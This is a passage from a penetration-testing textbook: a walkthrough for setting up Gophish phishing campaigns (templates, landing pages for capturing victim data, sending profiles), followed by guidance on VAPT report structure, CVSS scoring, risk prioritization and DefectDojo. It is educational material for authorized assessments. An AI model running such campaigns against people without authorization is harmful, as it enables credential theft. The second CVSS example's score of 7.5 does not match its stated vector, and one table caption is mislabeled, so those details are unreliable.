Phishing serves as an assessment technique employed by both security professionals and malicious actors to deceive individuals and extract sensitive information, including login credentials, credit card details, business plans and personal data. It can also involve the installation of malicious tools or software, enabling malicious activities like backdooring, ransomware attacks, or data theft. This deceptive approach commonly relies on deceptive emails, instant messages, or websites that present themselves as legitimate; tricking unsuspecting users into unintentionally sharing their confidential information with unauthorized individuals. The acquired information can then be used directly or indirectly by security professionals to plan and execute advanced attack strategies.

Phishing plays a valuable role in security assessments due to the following reasons:

*   Assessing vulnerabilities: Through the simulation of phishing attacks, organizations can evaluate the susceptibility of their employees to such tactics. This helps identify potential weaknesses in existing security awareness and training programs.

*   Increasing awareness: Phishing simulations serve as educational tools, enhancing employees’ understanding of the risks and consequences associated with phishing attacks. It allows organizations to deliver targeted training, reinforcing the organization’s overall cybersecurity posture.

*   Evaluating incident response: Phishing assessments enable organizations to assess the effectiveness of their incident response processes and procedures. By analyzing how employees handle simulated phishing attacks, organizations can pinpoint areas that require improvement in incident detection, reporting, response protocols, and the incorporation of new security policies and procedures.

[Phishing approach and methodology](#contents.xhtml_sc3_266a)

When conducting a phishing security assessment, organizations typically follow the subsequent steps, as depicted in [Figure 9.72](#ch09.xhtml_fig9-72):

![](images/Figure_9.72.png)

Figure 9.72: Phishing approach and methodology

1.  Planning: Begin by defining the assessment’s objectives, scope, target audience, and parameters for assessment. This may involve creating templates, landing pages, and informative content.

2.  Crafting scenarios: Develop authentic phishing emails or context that aligns with the organization’s industry, prevailing communication patterns, current global events, or trending topics.

3.  Delivery and tracking: Distribute the simulated phishing emails to the designated employees or user groups. Employ tracking mechanisms to monitor recipients’ actions, such as email openings, link clicks, and credential/details submissions.

4.  Analysis and reporting: Evaluate the results of the phishing assessment, including open rates, click rates, response rates, and incident reports. Assess the effectiveness of security controls, pinpoint areas for improvement, and generate comprehensive reports containing actionable recommendations.

5.  Training and awareness: Based on the assessment findings, provide targeted training and awareness programs to educate employees about the risks, techniques, and preventive measures associated with phishing attacks. Reinforce adherence to security best practices to enhance resilience against real-world phishing attempts.

Below are some widely recognized open-source phishing simulators utilized in the industry:

*   Gophish

*   LUCY

*   Simple Phishing Toolkit (sptoolkit)

*   Phishing Frenzy

*   King Phisher

*   SpeedPhish Framework (SPF)

*   Social-Engineer Toolkit (SET)

To understand this practically, here will go for the setup of Gophish.

[Gophish](#contents.xhtml_sc4_267a)

Gophish is an open-source phishing framework commonly used for conducting simulated phishing campaigns and evaluating the security awareness of organizations. It features a user-friendly web interface that allows security professionals to easily create customized phishing scenarios, design email templates, track recipient actions, and generate detailed reports.

To set up Gophish on linux, follow these step-by-step instructions:

1.  Download Gophish: Visit the Gophish GitHub repository ([https://github.com/gophish/gophish/releases](https://github.com/gophish/gophish/releases)) and download the latest release ZIP file. Refer [Figure 9.73](#ch09.xhtml_fig9-73) for visual guidance:

    ![](images/Figure_9.73.png)

    Figure 9.73: Download Gophish

2.  Extract Gophish: Open a terminal and navigate to the downloads folder. Use the command unzip gophish-downloaded-zip.zip to extract the contents of the ZIP file. Refer [Figure 9.74](#ch09.xhtml_fig9-74) for visual guidance:

    ![](images/Figure_9.74.png)

    Figure 9.74: Extract Gophish

3.  Set Permissions: Make the Gophish binary executable by running the command chmod +x gophish. Refer [Figure 9.75](#ch09.xhtml_fig9-75) for visual guidance:

    ![](images/Figure_9.75.png)

    Figure 9.75: Set permissions

4.  Start Gophish: Launch Gophish by executing the command ./gophish. Refer to [Figure 9.76](#ch09.xhtml_fig9-76) for visual guidance:

    ![](images/Figure_9.76.png)

    Figure 9.76: Start Gophish

5.  Access the Gophish web interface: Open a web browser and enter http://localhost:3333 to access the Gophish web interface. To log in, use the default username and password: admin: 73e15a78b09e7c9b. Refer [Figure 9.77](#ch09.xhtml_fig9-77) for visual guidance.

    ![](images/Figure_9.77.png)

    Figure 9.77: Access the Gophish Web Interface

6.  Create new password: After entering the one-time password, you will be prompted to create a new password. Refer to [Figure 9.78](#ch09.xhtml_fig9-78) for visual guidance:

    ![](images/Figure_9.78.png)

    Figure 9.78: Create new password

7.  Set up Gophish: Follow the on-screen instructions within the Gophish web interface to complete the initial setup. This includes setting the admin password, configuring email settings, and creating your first phishing campaign. Refer [Figure 9.79](#ch09.xhtml_fig9-79) for visual guidance:

    ![](images/Figure_9.79.png)

    Figure 9.79: Set up Gophish

8.  Click on Email Templates and create a new template using HTML or normal text. Refer [Figure 9.80](#ch09.xhtml_fig9-80) for visual guidance:

    ![](images/Figure_9.80.png)

    Figure 9.80: Create a new template

9.  Click on Landing Pages to create a new page where the victim will land and submit their personal data after clicking the email link. Refer [Figure 9.81](#ch09.xhtml_fig9-81) for visual guidance:

    ![](images/Figure_9.81.png)

    Figure 9.81: Landing pages

10.  Click on Sending Profiles to configure the email account details from which the phishing emails will be sent. Refer [Figure 9.82](#ch09.xhtml_fig9-82) for visual guidance:

    ![](images/Figure_9.82.png)

    Figure 9.82: Sending profiles

11.  Now click on Campaigns and start rolling out emails using the selected template and identified user groups. Refer [Figure 9.83](#ch09.xhtml_fig9-83) for visual guidance:

    ![](images/Figure_9.83.png)

    Figure 9.83: Campaigns

12.  Explore the Gophish Dashboard to access information about your campaigns, such as the number of emails sent, opened, and data submitted. You can also investigate each line item in detail to understand the timing of opens and the data submitted by victims. Based on this detailed analysis, you can prepare a comprehensive report. A sample [Figure 9.84](#ch09.xhtml_fig9-84) illustrates the Dashboard:

    ![](images/Figure_9.84.png)

    Figure 9.84: Gophish dashboard

| Note: By leveraging phishing assessments, organizations can proactively address vulnerabilities, heighten employee awareness, and refine incident response capabilities, ultimately bolstering their overall cybersecurity resilience. |

[Conclusion](#contents.xhtml_sc2_268a)

In this chapter, we explored the significance of bypassing security controls, advancements in security measures, and techniques to bypass them during network reconnaissance. We also discussed strategies to outsmart Windows Defender and examined various antivirus evasion techniques and tools like Metasploit templates, Shellter, Unicorn, Phantom-Evasion, and Invoke-Stealth. Additionally, we touched on cutting-edge WAF evasion tactics and evolving social engineering methods such as phishing simulations and the use of Gophish. Acquiring these skills will empower pen testers to conduct advanced attacks by bypassing security controls and assess the environment behind them. Furthermore, it allows for the evaluation of the effectiveness of applied security controls, testing their resilience, and identifying potential vulnerabilities.

In the upcoming chapter, we will delve into the art of report writing which is a critical aspect of the industry. Comprehensive assessments are incomplete without well-crafted reports that meet the required standards. We will provide examples of detailed reports, covering technical and logical vulnerabilities, along with recommendations. Additionally, we will explore the calculation of CVSS scores and the decision-making process for severity classification. Moreover, we will focus on creating impactful presentations and security dashboards to effectively communicate assessment findings.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 10Revolutionary Approaches to Report Writing](#contents.xhtml_ch10a)

[Introduction](#contents.xhtml_sc2_269a)

In this chapter, we will delve into the art of report writing, a crucial aspect of the industry. Assessments are incomplete without well-crafted reports that meet the required standards. We will provide examples of detailed reports covering technical and logical vulnerabilities, along with recommendations. We will also explore calculating CVSS scores, assessing risk, prioritizing risks, and classifying severity. Additionally, we will focus on creating impactful presentations and security dashboards to effectively communicate assessment findings.

[Structure](#contents.xhtml_sc2_270a)

In this chapter we will discuss the following topics:

*   Overview of report writing

*   Components of well-crafted reports

*   Utilizing CVSS scores

    *   Factors influencing CVSS scores

    *   Interpreting and applying CVSS scores appropriately

*   Risk assessment and prioritization

    *   Quantifying risks for effective assessment

*   Types of cybersecurity assessment reports

    *   Executive summary report

    *   Detailed technical assessment report

    *   Vulnerability management tracker

*   Examples of detailed reports

    *   Web application VAPT report writing example

    *   Network VAPT report writing example

*   Automated vulnerability management with DefectDojo

[Objectives](#contents.xhtml_sc2_271a)

This chapter seeks to help you grasp effective report writing in cybersecurity. It covers report essentials and CVSS scores, aiming to enable you to understand and use them accurately. It also leads you through risk assessment, emphasizing risk quantification for better evaluation. The chapter explores different types of cybersecurity reports, like Executive Summaries, Detailed Technical Assessments, and Vulnerability Trackers. It provides hands-on examples of web apps and network vulnerabilities. Lastly, it sheds light on automated vulnerability management with DefectDojo, enhancing your ability to create impactful cybersecurity reports.

[Overview of report writing](#contents.xhtml_sc2_272a)

In cybersecurity assessments, report writing is essential, especially for Vulnerability Assessment and Penetration Testing (VAPT). It involves documenting findings, severity, impact, and recommendations from both technical and non-technical evaluations. The goal is to provide a clear and concise representation of the assessment results, helping stakeholders understand identified vulnerabilities or gaps and take appropriate risk mitigation actions effectively.

[Importance of report writing in cybersecurity](#contents.xhtml_sc3_273a)

VAPT reports play a significant role in formal communication channels among security professionals, management teams, relevant stakeholders, and clients, especially in client-centric organizations. Additionally, these reports serve as comprehensive records of the assessment process, capturing the steps taken, tools used, and methodology employed during the VAPT assessment. By doing so, this documentation ensures transparency and traceability, allowing for thorough scrutiny and review by both internal and external entities. Moreover, professional reporting can bridge the gap between technical jargon and actionable insights, making it easier for decision-makers to understand and act upon the provided pointers.

[Integrating reports in comprehensive assessments](#contents.xhtml_sc3_274a)

Integrating reports into comprehensive VAPT assessments is crucial for organizations. This approach offers a holistic understanding of security weaknesses, enabling the development of strategic plans for proactive vulnerability monitoring and management. By providing a consolidated view of vulnerabilities, risks, and recommended remediation measures; integrated reporting becomes a valuable reference throughout the vulnerability management lifecycle. It allows organizations to monitor the effectiveness of implemented measures and take necessary actions to maintain a robust security posture over time.

| Tip: For businesses operating under industry regulations or oversight of governing bodies, thorough and precise reporting holds utmost importance. It enables them to present their security posture, efforts in managing risks, and commitment to complying with regulatory guidelines. A well-structured report fosters trust and confidence among stakeholders, clients, and regulators, ensuring transparency in security protocols. |

[Components of well-crafted reports](#contents.xhtml_sc2_275a)

The VAPT report must adhere to applicable guidelines and regulatory requirements, which can vary significantly from one organization to another, as well as from one industry standard to another or even from one country to another. In such scenarios, the pentesting report should encompass the minimum baseline standards that address the fundamental needs of all regulatory and compliance bodies.

Hence, by thoroughly understanding these varied requirements, we can create a comprehensive report encompassing the following essential components, as illustrated in [Table 10.1](#ch10.xhtml_tab10-1):

| Component | Description |
| Cover Page | Includes essential details about the audit, such as auditee and auditing firm name, assessment name, report type, and publish date. |
| Version Control | Provides information about the report’s publish history. |
| Table of Contents | Lists all sections and subsections in the report. |
| Engagement Details | Includes details about the scope of the assessment, SPOCs involved, and the project timeline. |
| Executive Summary | Summarizes critical aspects of the assessment, such as CVSS score, severity matrix, list of vulnerabilities, and observation summary. |
| Severity-wise Vulnerability Distribution | Presents the distribution of vulnerabilities based on severity levels. |
| Detailed Report | Provides a comprehensive breakdown of vulnerabilities, including their details and recommended remediation steps. |
| Annexure -1 | Provides details related to reconnaissance findings, including open ports, web treemap, and a list of running services. |
| Annexure -2 | Provide information, such as the VAPT approach and methodology used in the assessment, details about the toolset utilized, and SME (Subject Matter Expert) information. |

Table 10.1: Antivirus Evasion Techniques

Let us delve into each component listed in the table above to explore them in detail:

*   Cover page: The cover page of the VAPT report provides an overview of the high-level engagement, encompassing the following details:

    *   Auditee organization name

    *   Auditing organization name

    *   Assessment name

    *   Report type

    *   Report publish date

    Presented below is a sample cover page design for the detailed technical VAPT report, as shown in [Figure 10.1](#ch10.xhtml_fig10-1):

    ![](images/Figure_10.1.jpg)

    Figure 10.1: Cover page

*   Version control: The version control section of the report manages its history, encompassing contributor details (preparers, reviewers, and approvers), as well as the initial release date and subsequent versions with their respective publish dates. Compliance requirements mandate proper document control for easily tracing back to earlier versions, as shown in [Figure 10.2](#ch10.xhtml_fig10-2):

    ![](images/Figure_10.2.jpg)

    Figure 10.2: Version control

*   Table of contents: This component provides a high-level guide to the report by listing all sections and subsections, as shown in [Figure 10.3](#ch10.xhtml_fig10-3):

    ![](images/Figure_10.3.jpg)

    Figure 10.3: Table of contents

*   Engagement details: This component aims to provide a detailed understanding of the assessment to the client/reader, covering the following information:

    *   Scope details

    *   Single Point of Contact (SPOC) details

    *   Project timeline

    Here is a sample of the engagement detail section, as depicted in [Figure 10.4](#ch10.xhtml_fig10-4):

    ![](images/Figure_10.4.jpg)

    Figure 10.4: Engagement details

*   Executive summary: This component contains crucial information about the assessment, providing C-level executives of the client with a concise overview of the security posture of scoped assets. It covers the following areas:

    *   Observation summary

    *   Vulnerability distribution

    *   CVSS score and severity matrix

    In the upcoming section, we will delve deeper into the CVSS score calculation and severity matrix. Below is a sample of the executive summary section, illustrated in [Figure 10.5](#ch10.xhtml_fig10-5) and [Figure 10.6](#ch10.xhtml_fig10-6):

    [Figure 10.5](#ch10.xhtml_fig10-5) depicts the executive summary, summary of findings, and the distribution of vulnerabilities, detailed below:

    ![](images/Figure_10.5.jpg)

    Figure 10.5: Executive summary

    Illustrated in [Figure 10.6](#ch10.xhtml_fig10-6) is the metric for calculating the CVSS score, presented as follows:

    ![](images/Figure_10.6.jpg)

    Figure 10.6: Common vulnerability scoring system

*   Severity-wise vulnerability distribution: This component lists all observations with their corresponding CVSS scores and associated severity. During revalidation, the same table can be utilized to indicate the status, whether the vulnerability is closed or still open. Below is a sample of the vulnerability distribution section, as depicted in [Figure 10.7](#ch10.xhtml_fig10-7):

    ![](images/Figure_10.7.jpg)

    Figure 10.7: Severity-wise vulnerability distribution

*   Detailed report: This section acts as the powerhouse or master information depot of the VAPT assessment report, containing all the information presented in the above components. It exclusively provides technical details intended for Developers and DevOps teams to comprehend the issues, and their impact and follow the technical remediation steps. The following information is included in this section:

    *   Vulnerability name

    *   CVSS score

    *   Severity

    *   Description

    *   Affected endpoints

    *   Proof of Concept (PoC)

    *   References to CVE and CWE

    *   Impact

    *   Remediation

    *   References

    Below is a sample of the detailed report section, as depicted in [Figure 10.8](#ch10.xhtml_fig10-8):

    ![](images/Figure_10.8.jpg)

    Figure 10.8: Detailed report

*   Annexure -1: This component is intended to encompass all reconnaissance data about the target, including any information collected during the reconnaissance phase, whether or not utilized for pentesting. It consists of the following information:

    *   Open ports

    *   Running services

    *   Web treemap

Below is a sample of the Annexure-1 section, as shown in [Figure 10.9](#ch10.xhtml_fig10-9):

![](images/Figure_10.9.jpg)

Figure 10.9: Annexure -1

| Tip: This annexure serves two purposes: first, it provides clients with complete transparency on the assessment, and second, sometimes reconnaissance data that may not seem alarming can offer actionable intelligence to the asset owner. For example, identifying an unnecessary service running on an asset can help reduce the attack surface. |

*   Annexure -2: This component covers the following listed information, which may not be directly useful, but showcases the capability of the auditing organization:

    *   VAPT approach and methodology

    *   Subject Matter Expert (SME) details

    *   Service portfolio

Below is a sample of the Annexure-2 section, as depicted in [Figure 10.10](#ch10.xhtml_fig10-10) and [Figure 10.11](#ch10.xhtml_fig10-11):

[Figure 10.10](#ch10.xhtml_fig10-10) illustrates the VAPT approach and methodology, presented below:

![](images/Figure_10.10.jpg)

Figure 10.10: Annexure -2 (VAPT approach and methodology)

[Figure 10.11](#ch10.xhtml_fig10-11) presents an in-depth view of the SMEs and service portfolio of the service provider company, as outlined below:

![](images/Figure_10.11.jpg)

Figure 10.11: Annexure -2 (SME and service portfolio)

Furthermore, to gain a comprehensive understanding of the specific details that should be covered in a vulnerability assessment report and the additional in-depth information required for a penetration testing report, let us explore each of them in detail below:

[Vulnerability Assessment report](#contents.xhtml_sc3_276a)

Vulnerability Assessment (VA) report writing involves documenting the findings and outcomes of a vulnerability assessment performed on a system, network, or application. The report should comprehensively list all the identified vulnerabilities, regardless of their exploitability. It is essential to include the following information as a minimum baseline while explaining a vulnerability instance in detail:

*   Vulnerability name

*   CVSS score

*   Severity

*   Vulnerability priority ratings

*   Description

*   CVE or CWE reference

*   Impact

*   Remediation

*   References

[Penetration Testing report](#contents.xhtml_sc3_277a)

The Penetration Testing (PT) report serves as formal communication between the pentester and client, presenting outcomes of the penetration test on a system, network, API, Cloud, or application. When describing a vulnerability instance in detail, the PT report should encompass the following essential information:

*   Vulnerability name

*   CVSS score

*   Severity

*   Vulnerability priority ratings

*   Description

*   POC

*   Steps to reproduce

*   CVE or CWE reference

*   Impact

*   Remediation

*   References

| Tip: Initially, the auditing organization should submit the draft report in CSV format to the Auditee organisation. After agreeing on all the findings with the Auditee firm, the final report can be prepared and shared in PDF format with password protection. |

[Risk assessment and prioritization](#contents.xhtml_sc2_278a)

Risk assessment and prioritization are essential in VAPT and technical risk assessment. It involves identifying and evaluating potential risks and vulnerabilities that can impact an organization. By prioritizing risks based on severity and criticality, organizations can focus on addressing vulnerabilities and strengthening their security. Regular risk assessments help organizations stay vigilant and adaptable to threats.

[Quantifying risks for effective assessment](#contents.xhtml_sc3_279a)

In VAPT, quantifying risk means assigning numeric values to factors like vulnerability severity, asset type, criticality, environment, ease of exploitation, and security controls’ effectiveness. Different methodologies, such as risk-scoring models and matrices, can be used for risk quantification. They help evaluate the risk associated with each vulnerability and prioritize remediation. Presented below is a sample risk score-based Vulnerability Priority Rating (VPR) matrix, as depicted in [Figure 10.12](#ch10.xhtml_fig10-12):

![](images/Figure_10.12.png)

Figure 10.12: Risk quantification

To gain a better understanding, let us consider a real-world scenario to prioritize vulnerability fixes:

Scenario

A critical severity vulnerability with a CVSS score of 9.1 is discovered in a high-value asset that is both internet-facing and part of the production environment. Furthermore, known exploits for this vulnerability are publicly available.

To calculate the VPR, scores are assigned to each required metric as follows, as shown in [Table 10.2](#ch10.xhtml_tab10-2):

| S. No. | Metric | Name | Score |
| 1 | Vulnerability Severity | Critical | 20 |
| 2 | Asset Type | Prod | 20 |
| 3 | Asset Criticality | High-Value Assets | 20 |
| 4 | Asset Environment | Internet-Facing Assets | 20 |
| 5 | Ease of Exploitation | CVSS>8 | 15 |

Table 10.2: Vulnerability Priority Rating (VPR) matrix

The overall score is 95, falling under the P1 category, which requires immediate attention to address the finding.

| Tip: Risk quantification and assessment provide prioritization, data-driven decisions, resource optimization, proactive security, compliance adherence, business continuity, and better stakeholder communication for enhanced risk management. |

[Utilizing CVSS scores](#contents.xhtml_sc2_280a)

Common Vulnerability Scoring System (CVSS) is a widely adopted industry standard for assessing vulnerability severity. It assigns numerical scores from 0 to 10, where higher scores indicate more critical vulnerabilities. These scores aid security professionals in prioritizing findings and assist organizations or clients in devising effective patching strategies.

[Factors influencing CVSS scores](#contents.xhtml_sc3_281a)

Here are the factors that influence the CVSS score, as illustrated in [Table 10.3](#ch10.xhtml_tab10-3):

| Type of CVSS Score | Description |
| Base Score | The Base Score represents the potential impact of the vulnerability on the target system, solely based on intrinsic characteristics, without considering temporal or environmental factors. The following metrics are used for calculating the Base Score:• AV (Attack Vector)• AC (Attack Complexity)• PR (Privileges Required)• UI (User Interaction)• S (Scope)• C (Confidentiality)• I (Integrity)• A (Availability) |
| Temporal Score | The Temporal Score considers dynamic factors that can change over time, affecting the overall severity of the vulnerability. The calculation incorporates the following metrics:• E (Exploit Code Maturity)• RL (Remediation Level)• RC (Report Confidence) |
| Environmental Score | The Environmental Score accounts for the distinct characteristics of an organization’s environment and infrastructure. It involves the following metrics:• Modified Base Metrics• CR (Confidentiality Requirement)• IR (Integrity Requirement)• AR (Availability Requirement) |

Table 10.3: Factors influencing CVSS scores

The qualitative severity rating scale can be applied to all types of CVSS scores as follows, as depicted in [Table 10.4](#ch10.xhtml_tab10-4):

| Severity | Score Range | Color Coding |
| Critical | 9.0 - 10.0 |  |
| High | 7.0 - 8.9 |  |
| Medium | 4.0 - 6.9 |  |
| Low | 0.1 - 3.9 |  |
| None | 0.0 |  |

Table 10.4: Qualitative severity rating scale

[Interpreting and applying CVSS scores appropriately](#contents.xhtml_sc3_282a)

In this section, we will delve into the detailed process of calculating the CVSS score using real-life vulnerability examples. We will illustrate the process with a scenario and then provide a comprehensive explanation of each metric and its corresponding value.

Example 1: SQL injection vulnerability.

Here, we will delve into the calculation of the CVSS score for a specific scenario, outlined as follows:

*   Description: The e-commerce platform permits users to search for products by entering keywords in the search bar. However, the website’s SQL query lacks proper validation, making it susceptible to SQL injection attacks as it directly incorporates user input into the query.

*   Vulnerability: The presence of this vulnerability stems from the inadequate handling of user input, granting the pentester the ability to inject malicious SQL code into the query.

*   Attack: The pentester cleverly crafts a malicious input in the search bar, altering the query’s behavior and causing it to bypass the original search condition, consequently retrieving all records from the products table.

*   CVSS score & vector string:

    7.5 & CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

*   CVSS 3.1 Base Score Metrics Explanation: We will calculate the score using the website [https://www.first.org/](https://www.first.org/), as depicted in [Figure 10.13](#ch10.xhtml_fig10-13):

    ![](images/Figure_10.13.png)

    Figure 10.13: Base score metrics explanation

    The following [Table 10.5](#ch10.xhtml_tab10-5) provides an explanation of each metric along with their assigned values and comments:

    | Metric | Value | Comments |
    | AV (Attack Vector) | Network | The attack vector is designated as “Network” as the attacker can exploit the vulnerability remotely through the website’s search functionality. |
    | AC (Attack Complexity) | Low | The attack complexity is classified as low since the attacker does not require any specialized conditions or resources to exploit the vulnerability. |
    | PR (Privileges Required) | None | The attacker does not need any privileges to execute the SQL injection attack. |
    | UI (User Interaction) | None | The attack does not require user interaction. |
    | S (Scope) | Unchanged | The attack’s impact is limited to the web application and does not affect other components. |
    | C (Confidentiality) | High | The attack leads to a high confidentiality impact as it enables unauthorized access to sensitive data, including customer information. |
    | I (Integrity) | None | The attack does not directly impact data integrity. |
    | A (Availability) | None | The attack does not directly affect system availability. |

    Table 10.5: CVSS metric explanation

    Example 2: Privilege escalation

*   Description: In an e-commerce web application, users can register as customers and access their accounts using a login page. Regrettably, the application contains a vulnerability that facilitates privilege escalation, allowing pentester to gain unauthorized administrative access to the system.

*   Vulnerability: The web application’s vulnerability stems from inadequate user authentication and authorization processes. Specifically, the application fails to sufficiently verify user privileges during request processing, enabling attackers to manipulate their access rights.

*   Attack: In order to exploit the privilege escalation vulnerability, a pentester skillfully crafts a malicious request targeted at the web application. Through tampering with request parameters or employing specific methods, the pentester gains the ability to manipulate their user role or privileges, potentially accessing unauthorized features or sensitive data.

*   CVSS Score & vector string:

    7.5 & CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

*   CVSS 3.1 Base Score Metrics Explanation:

We will calculate the score using the website [https://www.first.org/](https://www.first.org/), as depicted in [Figure 10.14](#ch10.xhtml_fig10-14):

![](images/Figure_10.14.png)

Figure 10.14: Base score metrics explanation

The following [Table 10.6](#ch10.xhtml_tab10-6) provides an explanation of each metric along with their assigned values and comments:

| Metric | Value | Description |
| AV (Attack Vector) | Network | The vulnerability can be exploited remotely over the network, which classifies the attack vector as “Network.” |
| AC (Attack Complexity) | Low | The attack complexity is low, as the privilege escalation requires minimal effort and no specialized conditions. |
| PR (Privileges Required) | Low | The attacker initially needs basic user privileges to launch the attack but can escalate them for administrative access. |
| UI (User Interaction) | None | It does not necessitate any user interaction. |
| S (Scope) | Unchanged | The vulnerability’s impact is limited to the application’s environment, without affecting other components. |
| C (Confidentiality) | High | The privilege escalation results in a significant loss of confidential data. |
| I (Integrity) | High | The privilege escalation allows unauthorized modification of sensitive data, posing a significant integrity risk. |
| A (Availability) | None | The privilege escalation vulnerability does not directly impact the application’s or system’s availability. |

Table 10.6: CVSS metric explanation

| Tip: Using CVSS calculation in VAPT assessments brings benefits like consistent severity ratings, data-driven risk prioritization, efficient vulnerability analysis, accurate impact assessment, and better communication with stakeholders for effective decision-making. |

[Types of cybersecurity assessment reports](#contents.xhtml_sc2_283a)

Different cybersecurity assessment reports are conducted with specific objectives and focus areas. Common types of VAPT assessment reports include the following:

[Executive summary report](#contents.xhtml_sc3_284a)

The executive summary report is a brief, non-technical document for top-level stakeholders, like C-level executives and management. It overviews key findings, critical vulnerabilities, and security risks from the VAPT assessment. It also outlines the assessment scope and risk posture to help decision-makers make informed cybersecurity improvements and risk mitigation strategies. To gain a better understanding of this report, please refer to the Executive Summary subsection under the Components of a well-crafted report section in the earlier part of this chapter.

[Detailed technical assessment report](#contents.xhtml_sc3_285a)

The detailed technical assessment report is a comprehensive document designed for technical personnel like IT teams, DevOps, Developers, and system administrators. This report provides detailed descriptions of each vulnerability, its severity, impact, and recommended remediation steps. It also includes POC to illustrate the severity of the risks. The primary purpose is to help technical experts understand vulnerabilities and implement effective security measures for the organization’s IT infrastructure. This report will follow the guidelines explained in the Components of a Well-Crafted Report section in the earlier part of this chapter.

[Vulnerability management tracker](#contents.xhtml_sc3_286a)

The Vulnerability Management (VM) tracker is a handy tool to monitor and manage security vulnerabilities found during assessments like VAPT. It acts as a centralized database, recording and prioritizing vulnerabilities based on severity. The VM tracker facilitates real-time sharing of critical findings with clients, enabling prompt resolution. Security teams can assign ownership, set deadlines, and track progress for effective vulnerability management. [Figure 10.15](#ch10.xhtml_fig10-15) displays a sample of the vulnerability management tracker:

![](images/Figure_10.15.png)

Figure 10.15: Vulnerability management tracker

| Tip: A good VAPT report includes an executive summary, scope, methodology, detailed vulnerability findings, risk assessment, remediation recommendations, compliance adherence, and visual aids for clarity. |

[Examples of detailed reports](#contents.xhtml_sc2_287a)

While there are numerous verticals in VAPT and technical security assessments, we will focus on a few key aspects of the IT landscape to provide sample reports.

[Web application VAPT report writing example](#contents.xhtml_sc3_288a)

The Web application VAPT report provides a comprehensive overview of an assessment conducted on a web application. We will use the example of a technical vulnerability, such as SQL Injection, to illustrate report writing and understand the essential details needed to explain a specific vulnerability instance, as depicted in the following figures:

In [Figure 10.16](#ch10.xhtml_fig10-16), the vulnerability’s name, severity, CVSS score, description, affected endpoint, and corresponding proof of concept are depicted as follows:

![](images/Figure_10.16.jpg)

Figure 10.16: Web Application VAPT report writing example

[Figure 10.17](#ch10.xhtml_fig10-17) illustrates the comprehensive Proof Of Concept (POC) along with the step-by-step instructions for reproduction, outlined below:

![](images/Figure_10.17.jpg)

Figure 10.17: Web application VAPT report writing example

Displayed in [Figure 10.18](#ch10.xhtml_fig10-18) are the CVE/CWE references, impact, remediation steps, and references, presented as follows:

![](images/Figure_10.18.jpg)

Figure 10.18: Web application VAPT report writing example

[Network VAPT report writing example](#contents.xhtml_sc3_289a)

The Network VAPT report provides a comprehensive overview of an assessment conducted on a Network asset. We will use the example of the EternalBlue SMB Remote Code Execution Vulnerability to demonstrate report writing and understand the minimum information required to explain a specific vulnerability instance, as depicted in [Figures 10.19](#ch10.xhtml_fig10-19), [10.20](#ch10.xhtml_fig10-20) and [10.21](#ch10.xhtml_fig10-21):

![](images/Figure_10.19.jpg)

Figure 10.19: Network VAPT report writing example

![](images/Figure_10.20.jpg)

Figure 10.20: Network VAPT report writing example

![](images/Figure_10.21.jpg)

Figure 10.21: Network VAPT report writing example

Just like web application and network reporting examples, the following assessments can also follow a similar structure:

*   Mobile VAPT

*   Wireless VAPT

*   API pentesting

*   Secure code review

*   Security configuration review, and so on.

[Automated vulnerability management with DefectDojo](#contents.xhtml_sc2_290a)

VM is crucial for protecting an organization’s digital assets, maintaining records of findings, prioritizing, and tracking patching status while ensuring accountability. In this discussion, we will explore automated VM using the open-source platform, DefectDojo.

DefectDojo is a security orchestration and vulnerability management platform. It facilitates application security program management, tracks product and application details, evaluates vulnerabilities, and integrates with JIRA and Slack. The platform refines vulnerability data using heuristic algorithms that continuously improve with usage. You can download and install DefectDojo from the following link: [https://github.com/DefectDojo/django-DefectDojo](https://github.com/DefectDojo/django-DefectDojo).

Here are some benefits of DefectDojo:

*   Centralized vulnerability management: DefectDojo provides a central platform to manage and track vulnerabilities across applications and infrastructure components.

*   Seamless vulnerability scanning integration: This platform easily integrates with various vulnerability scanning tools, automatically importing and analyzing scan findings.

*   Improved risk assessment: DefectDojo offers risk scoring for vulnerabilities based on severity, impact, and exploitability by prioritizing critical issues.

*   Efficient reporting and metrics: Customizable reports and metrics aid in understanding security posture, identifying trends, and making informed decisions.

*   Enhanced collaboration and communication: Integration with tools like JIRA and Slack fosters better collaboration among security teams, developers, and stakeholders.

*   Historical tracking and trend analysis: The platform maintains a historical record of vulnerabilities, enabling trend analysis and continuous security improvement.

DefectDojo boasts an intuitive and user-friendly interface, making it easily accessible and straightforward for security professionals and developers. Now, let us delve into some of the key features of DefectDojo:

*   Dashboard: The customizable dashboard in DefectDojo presents essential metrics, charts, and graphs, offering a quick overview of vulnerabilities, risk trends, and overall security progress. Users can easily monitor ongoing engagements, risk acceptance, critical findings, and other pertinent security data, as depicted in [Figure 10.22](#ch10.xhtml_fig10-22):

    ![](images/Figure_10.22.png)

    Figure 10.22: DefectDojo dashboard

*   Add Engagement: With the Add Engagement feature, DefectDojo allows users to create and manage security engagements, representing specific projects or testing activities. Users can include essential details like name, start and end dates, and description, and so on., streamlining the organization and tracking various security initiatives, as illustrated in [Figure 10.23](#ch10.xhtml_fig10-23):

    ![](images/Figure_10.23.png)

    Figure 10.23: Add engagement

*   Add new finding: This feature allows the user to add new findings to the engagement. To do this, navigate to Engagements | Active Engagements, select the specific engagement, click on Findings, and then click on Add New Finding, as illustrated in [Figure 10.24](#ch10.xhtml_fig10-24):

    ![](images/Figure_10.24.png)

    Figure 10.24: Add new finding

*   Risk acceptance: Risk acceptance plays a critical role in vulnerability management. DefectDojo’s risk acceptance feature simplifies the process of reviewing and accepting vulnerabilities based on specific criteria, such as business impact, compensating controls, or risk tolerance, as depicted in [Figure 10.25](#ch10.xhtml_fig10-25):

    ![](images/Figure_10.25.png)

    Figure 10.25: Risk acceptance

*   Metrics dashboard: The metrics dashboard in DefectDojo offers an overview of various metrics, including open vulnerabilities by month, risk accepted by month, and total findings in the given period, categorized by severity. This visual representation is presented in [Figure 10.26](#ch10.xhtml_fig10-26), providing valuable insights (limited visibility due to the page’s excessive length preventing the display of all information within a single snapshot.) into the organization’s vulnerability landscape and security trends:

![](images/Figure_10.26.png)

Figure 10.26: Metrics dashboard

